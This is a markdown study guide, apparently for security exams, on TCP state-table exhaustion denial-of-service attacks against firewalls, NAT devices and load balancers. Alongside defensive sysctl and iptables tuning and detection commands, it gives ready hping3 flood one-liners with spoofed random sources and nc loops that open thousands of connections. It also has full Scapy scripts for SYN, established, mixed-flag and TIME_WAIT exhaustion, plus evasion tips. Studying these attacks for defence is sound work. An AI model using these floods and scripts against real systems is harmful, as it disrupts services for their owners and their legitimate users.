# TCP State Exhaustion Attack

## üìç Attack Classification
- **Category**: Resource Exhaustion / State Table Attack
- **OSI Layer**: Layer 4 (Transport)
- **Protocol**: TCP
- **Port**: Any TCP port (commonly 80, 443, 22, 25)

## üéØ Attack Mechanism
Exploits **TCP connection state tracking** by overwhelming firewalls, load balancers, and NAT devices with excessive connection states, causing state table exhaustion and preventing new legitimate connections from being tracked.

### How it Works:
1. **State Table Targeting**: Creates numerous TCP connection states
2. **Resource Consumption**: Exhausts finite state table memory
3. **Connection Tracking Failure**: System cannot track new connections
4. **Service Disruption**: Legitimate traffic is dropped or rejected

## üîç Key Characteristics
- **Stateful Device Focus**: Targets devices maintaining connection state
- **Memory Exhaustion**: Consumes state table memory
- **Half-Open Connections**: Often uses incomplete connections
- **Distributed Impact**: Affects multiple services simultaneously

## üö® Exam Focus Points

### Critical Numbers:
- **Typical State Table Size**: 10,000-500,000 entries
- **Memory per State**: 64-256 bytes per connection state
- **State Timeout**: 30 seconds to 24 hours (varies by state)
- **Attack Rate**: 1,000-50,000+ states/sec
- **Recovery Time**: 30 seconds to several minutes

### Common Exam Questions:
- **Q**: What is a TCP connection state table?
- **A**: Memory structure tracking active TCP connections and their states
- **Q**: Which devices are most vulnerable to state exhaustion?
- **A**: Firewalls, NAT routers, and stateful load balancers
- **Q**: What TCP states consume the most resources?
- **A**: ESTABLISHED, TIME_WAIT, and FIN_WAIT states

### Attack Components:
- **State Creation**: Generating multiple TCP states
- **State Persistence**: Keeping states active longer
- **Memory Pressure**: Exhausting available state memory
- **Cleanup Prevention**: Preventing normal state cleanup

## ‚ö° Attack Variations

### SYN State Exhaustion:
- **Method**: Send SYNs without completing handshake
- **Impact**: Creates SYN_RECV states
- **Target**: Connection backlog and state tables
- **Duration**: Limited by SYN timeout (typically 60-180 seconds)

### Established State Exhaustion:
- **Method**: Complete handshake then maintain connections
- **Impact**: Creates ESTABLISHED states
- **Resource**: Higher memory consumption
- **Persistence**: Long-lasting state entries

### FIN_WAIT State Exhaustion:
- **Method**: Send FIN packets to create closing states
- **Impact**: Creates FIN_WAIT states
- **Timeout**: Moderate persistence (60-120 seconds)
- **Cleanup**: Delayed state cleanup

### TIME_WAIT State Exhaustion:
- **Method**: Complete connection close process
- **Impact**: Creates TIME_WAIT states
- **Duration**: Typically 60-240 seconds
- **Volume**: Can accumulate rapidly

## üõ°Ô∏è Detection & Mitigation
- **State Monitoring**:
  - Connection state tracking
  - State table usage monitoring
  - Memory utilization alerts
  - Connection rate limiting

- **Device Configuration**:
  - Increase state table size
  - Optimize timeout values
  - Implement state limits per source
  - Configure aggressive cleanup

### System Hardening:
```bash
# Linux connection tracking tuning
echo 'net.netfilter.nf_conntrack_max = 1048576' >> /etc/sysctl.conf
echo 'net.netfilter.nf_conntrack_tcp_timeout_established = 300' >> /etc/sysctl.conf
echo 'net.netfilter.nf_conntrack_tcp_timeout_time_wait = 30' >> /etc/sysctl.conf
echo 'net.netfilter.nf_conntrack_tcp_timeout_fin_wait = 60' >> /etc/sysctl.conf
echo 'net.netfilter.nf_conntrack_tcp_timeout_close_wait = 30' >> /etc/sysctl.conf

# TCP state optimization
echo 'net.ipv4.tcp_max_tw_buckets = 400000' >> /etc/sysctl.conf
echo 'net.ipv4.tcp_tw_reuse = 1' >> /etc/sysctl.conf
echo 'net.ipv4.tcp_fin_timeout = 15' >> /etc/sysctl.conf
echo 'net.ipv4.tcp_keepalive_time = 300' >> /etc/sysctl.conf

# Apply settings
sysctl -p

# iptables state limiting
iptables -A INPUT -m state --state NEW -m limit --limit 50/sec --limit-burst 100 -j ACCEPT
iptables -A INPUT -m state --state NEW -j DROP

# Per-source connection limiting
iptables -A INPUT -p tcp -m state --state NEW -m recent --set --name conn_limit
iptables -A INPUT -p tcp -m state --state NEW -m recent --update --seconds 60 --hitcount 20 --name conn_limit -j DROP
```

## üîß Attack Tools & Commands
- **hping3**: State creation and manipulation
- **nmap**: Connection state testing
- **scapy**: Custom state exhaustion scripts
- **netcat**: Connection establishment

### Manual Testing:
```bash
# Basic SYN state exhaustion
hping3 -S -p 80 --flood --rand-source target_ip

# Established state exhaustion
for i in {1..10000}; do
    nc target_ip 80 &
done

# FIN_WAIT state creation
hping3 -F -p 80 --flood target_ip

# TIME_WAIT state generation
for i in {1..1000}; do
    echo "GET / HTTP/1.0" | nc target_ip 80 &
done

# Mixed state exhaustion
for state in S F R A; do
    hping3 -$state -p 80 --flood target_ip &
done
```

## üí° Historical Context
- **Early Firewalls**: Simple state table attacks
- **NAT Era**: Router state table exhaustion
- **Modern Stateful**: Advanced state tracking attacks
- **Cloud Security**: Distributed state exhaustion

## üìä TCP State Resource Consumption
| TCP State | Memory Usage | Typical Timeout | Attack Difficulty |
|-----------|--------------|-----------------|-------------------|
| SYN_RECV | 64-128 bytes | 60-180 seconds | Easy |
| ESTABLISHED | 128-256 bytes | 300-7200 seconds | Medium |
| FIN_WAIT | 96-192 bytes | 60-120 seconds | Medium |
| TIME_WAIT | 64-128 bytes | 60-240 seconds | Easy |

## üéØ Target Selection
Preferred targets:
- **Stateful firewalls** with limited state tables
- **NAT routers** handling many connections
- **Load balancers** with connection tracking
- **IPS/IDS systems** maintaining state
- **Proxy servers** with state tracking

## ‚ö†Ô∏è Vulnerable Configurations
- **Small state tables**: Insufficient state table size
- **Long timeouts**: Extended state persistence
- **No rate limiting**: Unlimited state creation
- **Poor cleanup**: Inefficient state management

## üîç Detection Indicators
- **High state table utilization**
- **Memory exhaustion** on stateful devices
- **Connection drops** for legitimate traffic
- **Device performance degradation**
- **Unusual connection state patterns**

### Detection Commands:
```bash
# Monitor connection tracking table
cat /proc/net/nf_conntrack | wc -l

# Check state table usage
echo $(cat /proc/sys/net/netfilter/nf_conntrack_count) / $(cat /proc/sys/net/netfilter/nf_conntrack_max)

# Monitor TCP states
ss -s

# Check specific TCP states
ss -tan state syn-recv | wc -l
ss -tan state established | wc -l
ss -tan state fin-wait-1 | wc -l
ss -tan state time-wait | wc -l

# Monitor memory usage
cat /proc/meminfo | grep -i conntrack

# Check connection state distribution
ss -tan | awk '{print $1}' | sort | uniq -c

# Real-time state monitoring
watch 'ss -s'
```

## üåê Network Impact
- **State Table Memory**: High consumption
- **Device Performance**: Significant degradation
- **Connection Processing**: Slower new connections
- **Bandwidth Usage**: Variable depending on method
- **Recovery Time**: Minutes to hours

## üí° Defense Strategy
1. **State Table Sizing**: Adequate memory allocation
2. **Timeout Optimization**: Aggressive cleanup timers
3. **Rate Limiting**: Control state creation rates
4. **Source Limiting**: Per-IP state limits
5. **Monitoring**: Real-time state table monitoring

## üîß Verification Commands
```bash
# Test state table capacity
for i in {1..50000}; do
    hping3 -S -p 80 -c 1 target_ip &
done

# Monitor state creation rate
watch 'ss -s | grep TCP'

# Check firewall state table
iptables -L -n -v

# Test connection establishment under load
time nc -w 1 target_ip 80

# Monitor system resources during attack
top -p $(pgrep -f firewall)

# Check kernel connection tracking
dmesg | grep conntrack
```

## üìà Attack Metrics
- **State Creation Rate**: 1,000-10,000 states/sec
- **Memory Consumption**: 1MB-1GB depending on scale
- **Device CPU Impact**: 20-80% utilization increase
- **Connection Failure Rate**: 10-100% of new connections
- **Recovery Time**: 1-30 minutes after attack stops

## üîÑ Advanced Evasion
- **Distributed Sources**: Multiple attacking IPs
- **State Type Mixing**: Various TCP state combinations
- **Timing Randomization**: Variable connection intervals
- **Legitimate Traffic Mixing**: Blend with normal traffic
- **Gradual Escalation**: Slowly increase state pressure

## üî¨ Attack Analysis
### Scapy Script Examples:
```python
from scapy.all import *
import random
import threading
import time

def syn_state_exhaustion(target_ip, target_port, count=10000):
    """SYN state exhaustion attack"""
    for i in range(count):
        src_ip = ".".join(str(random.randint(1,254)) for _ in range(4))
        src_port = random.randint(1024, 65535)
        
        packet = IP(src=src_ip, dst=target_ip) / \
                 TCP(sport=src_port, dport=target_port, flags="S")
        send(packet, verbose=0)
        
        if i % 100 == 0:
            print(f"Sent {i} SYN packets")

def established_state_exhaustion(target_ip, target_port, count=5000):
    """Established connection state exhaustion"""
    def create_connection(conn_id):
        try:
            # Complete 3-way handshake
            src_port = random.randint(1024, 65535)
            
            # SYN
            syn = IP(dst=target_ip) / TCP(sport=src_port, dport=target_port, flags="S", seq=1000)
            syn_ack = sr1(syn, timeout=1, verbose=0)
            
            if syn_ack and syn_ack[TCP].flags == 18:  # SYN-ACK
                # ACK
                ack = IP(dst=target_ip) / TCP(sport=src_port, dport=target_port, 
                                             flags="A", seq=1001, ack=syn_ack[TCP].seq+1)
                send(ack, verbose=0)
                print(f"Established connection {conn_id}")
                
                # Keep connection alive for extended period
                time.sleep(300)  # 5 minutes
                
        except Exception as e:
            print(f"Connection {conn_id} failed: {e}")
    
    threads = []
    for i in range(count):
        thread = threading.Thread(target=create_connection, args=(i,))
        thread.daemon = True
        thread.start()
        threads.append(thread)
        
        if i % 100 == 0:
            time.sleep(1)  # Prevent overwhelming
    
    # Wait for all connections
    for thread in threads:
        thread.join()

def mixed_state_exhaustion(target_ip, target_port, count=8000):
    """Mixed TCP state exhaustion attack"""
    flags_list = ["S", "F", "R", "A", "SF", "SA"]
    
    for i in range(count):
        src_ip = ".".join(str(random.randint(1,254)) for _ in range(4))
        src_port = random.randint(1024, 65535)
        flag = random.choice(flags_list)
        
        packet = IP(src=src_ip, dst=target_ip) / \
                 TCP(sport=src_port, dport=target_port, flags=flag, 
                     seq=random.randint(1, 4294967295))
        send(packet, verbose=0)
        
        if i % 200 == 0:
            print(f"Sent {i} mixed state packets")
            time.sleep(0.1)

def time_wait_exhaustion(target_ip, target_port, count=2000):
    """TIME_WAIT state exhaustion"""
    def create_time_wait(conn_id):
        try:
            src_port = random.randint(1024, 65535)
            
            # Establish connection
            syn = IP(dst=target_ip) / TCP(sport=src_port, dport=target_port, flags="S", seq=1000)
            syn_ack = sr1(syn, timeout=2, verbose=0)
            
            if syn_ack and syn_ack[TCP].flags == 18:
                # Complete handshake
                ack = IP(dst=target_ip) / TCP(sport=src_port, dport=target_port,
                                             flags="A", seq=1001, ack=syn_ack[TCP].seq+1)
                send(ack, verbose=0)
                
                # Initiate close (FIN)
                fin = IP(dst=target_ip) / TCP(sport=src_port, dport=target_port,
                                             flags="FA", seq=1001, ack=syn_ack[TCP].seq+1)
                fin_ack = sr1(fin, timeout=2, verbose=0)
                
                if fin_ack:
                    # Final ACK to complete close
                    final_ack = IP(dst=target_ip) / TCP(sport=src_port, dport=target_port,
                                                       flags="A", seq=1002, ack=fin_ack[TCP].seq+1)
                    send(final_ack, verbose=0)
                    print(f"TIME_WAIT state {conn_id} created")
                    
        except Exception as e:
            print(f"TIME_WAIT creation {conn_id} failed: {e}")
    
    threads = []
    for i in range(count):
        thread = threading.Thread(target=create_time_wait, args=(i,))
        thread.daemon = True
        thread.start()
        threads.append(thread)
        
        if i % 50 == 0:
            time.sleep(0.5)
    
    for thread in threads:
        thread.join()

# State monitoring function
def monitor_states():
    """Monitor TCP states during attack"""
    import subprocess
    
    while True:
        try:
            result = subprocess.run(['ss', '-s'], capture_output=True, text=True)
            print("=== TCP State Summary ===")
            print(result.stdout)
            print("========================")
            time.sleep(5)
        except KeyboardInterrupt:
            break

# Usage examples (for testing purposes only)
# syn_state_exhaustion("192.168.1.100", 80, 5000)
# established_state_exhaustion("192.168.1.100", 80, 1000)
# mixed_state_exhaustion("192.168.1.100", 80, 3000)
# time_wait_exhaustion("192.168.1.100", 80, 500)
```

## üõ†Ô∏è Mitigation Best Practices
- **Dynamic State Tables**: Auto-scaling state table size
- **Aggressive Timeouts**: Rapid state cleanup
- **Rate Limiting**: Per-source state creation limits
- **State Monitoring**: Real-time state table monitoring
- **Load Balancing**: Distribute state load across devices
- **Memory Management**: Efficient state memory allocation

## üîç Forensic Analysis
- **State Table Logs**: Analyze state creation patterns
- **Memory Usage**: Track state table memory consumption
- **Connection Patterns**: Identify abnormal state distributions
- **Source Analysis**: Map state creation to source IPs
- **Timeline Analysis**: Correlate state exhaustion with incidents

## üìã Response Checklist
1. **Immediate**: Implement emergency state limits and timeouts
2. **Short-term**: Block high-volume state creation sources  
3. **Medium-term**: Optimize state table configuration
4. **Long-term**: Deploy state exhaustion protection systems
